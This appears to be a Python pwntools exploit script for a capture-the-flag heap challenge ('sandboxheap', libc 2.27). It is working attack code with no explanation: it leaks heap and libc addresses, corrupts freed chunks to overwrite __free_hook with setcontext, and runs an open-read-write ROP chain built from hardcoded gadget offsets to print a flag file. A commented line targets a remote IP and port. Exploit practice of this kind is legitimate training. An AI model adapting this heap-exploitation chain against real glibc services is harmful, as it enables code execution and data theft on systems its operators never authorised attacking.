from decimal import setcontext
from pwn import *

io = process('./sandboxheap')
# io = remote('210.30.97.133',28069)
libc = ELF('./libc-2.27.so')
context.log_level = 'debug'

def add(idx,size):
    io.recvuntil('Your choice:')
    io.sendline('1')
    # pause()
    io.recvuntil('Index:')
    io.sendline(str(idx))
    # pause()
    io.recvuntil('Size:')
    io.sendline(str(size))
    # pause()
    # io.recvuntil('Done')
    
def free(idx):
    io.recvuntil('Your choice:')
    io.sendline('4')
    io.recvuntil('Index:')
    io.sendline(str(idx))
    
def show(idx):
    io.recvuntil('Your choice:')
    io.sendline('3')
    io.recvuntil('Index:')
    io.sendline(str(idx))

def edit(idx,txt):
    io.recvuntil('Your choice:')
    io.sendline('2')
    io.recvuntil('Index:')
    io.sendline(str(idx))
    io.recvuntil('Content:')
    io.sendline(txt)

def trans(num):
    return bin(num)[2:][::-1].ljust(64, '0')
    
def p():
    gdb.attach(io)
    

    
for i in range(7):
    add(i,248) #0x90
    
raw_input()
add(7,248)
add(8,248)
add(9,248)
add(10,248)
raw_input()
add(11,248)
add(12,248)
add(13,248)
add(14,248)
raw_input()
add(15,248)
    
    
for i in range(7):
    free(i)     #tache
raw_input()
# add(1,248)
add(1,496)
# free(0)

add(0,248)
show(0)
io.recvuntil('Content: ')
heapbase = u64(io.recv(6).ljust(8,b'\x00')) - 0x760

success("heapbase-->"+hex(heapbase))
free(0)
# pause()
# for i in range(7):
    # add(i,496)
chunk_7 = heapbase +0x950
chunk_8 = heapbase +0xa50
chunk_10 = heapbase +0xc50
chunk_11 = heapbase + 0xd50
chunk_13  = heapbase + 0xf50
chunk_14 = heapbase +0x1050
edit(7,trans(chunk_8)+trans(chunk_8)+'0'*(8*0xe0)+trans(0x100)+'0')
raw_input()
edit(8,trans(chunk_7)+trans(chunk_7))
raw_input()
edit(10,trans(chunk_11)+trans(chunk_11)+'0'*(8*0xe0)+trans(0x100)+'0')
raw_input()
edit(11,trans(chunk_10)+trans(chunk_10))
raw_input()
edit(13,trans(chunk_14)+trans(chunk_14)+'0'*(8*0xe0)+trans(0x100)+'0')
raw_input()
edit(14,trans(chunk_13)+trans(chunk_13))
raw_input()




free(8)
raw_input()
# # free(10)
show(7)

io.recvuntil('Content: ')
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x3ebca0

success('libcbase-->'+hex(libc_base))

bss = libc_base + libc.bss()
success('bss-->'+hex(bss))
free_hook = libc_base + libc.symbols['__free_hook']
success('freehook-->'+hex(free_hook))

pop_rdi = libc_base + 0x000000000002164f #: pop rdi ; ret
pop_rsi = libc_base + 0x0000000000023a6a #: pop rsi ; ret
pop_rdx = libc_base + 0x0000000000001b96 #: pop rdx ; ret
pop_rax = libc_base + 0x000000000001b500 #: pop rax ; ret

open_addr = libc_base + libc.symbols['open']
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']

setcontext = libc_base + libc.symbols['setcontext'] + 53
success("setcontext-->"+hex(setcontext))
free(11)
free(14)
raw_input()
add(8,496)
raw_input()
free(1)
raw_input()
edit(10,trans(free_hook))
raw_input()
add(14,496)
add(11,496)
add(0,496)
raw_input()
edit(0,trans(setcontext))
raw_input()
pause()
add(1,512)
add(2,512)
raw_input()

flag = 0x000067616c662f2e

flag_addr = heapbase+0x1460
new_stack_addr = heapbase + 0x2000
orw_addr = heapbase + 0x1670

orw = trans(flag_addr)
orw+= trans(pop_rsi) + trans(0) 
orw+= trans(pop_rdx) + trans(0x100) 
orw+= trans(open_addr)
orw+= trans(pop_rdi) + trans(3)
orw+= trans(pop_rsi) + trans(new_stack_addr)
orw+= trans(pop_rdx) + trans(0x100)
orw+= trans(read_addr)
orw+= trans(pop_rdi) + trans(1)
orw+= trans(pop_rsi) + trans(new_stack_addr)
orw+= trans(pop_rdx) + trans(0x100)
orw+= trans(write_addr) #0xd0

# payload = trans(flag) + 
# free(1)


payload  = trans(flag)+'0'*(8*0x90)+trans(0) + trans(orw_addr) + trans(pop_rdi)

edit(1,payload)
raw_input()
edit(2,orw)
raw_input()
free(1)
raw_input()

io.interactive()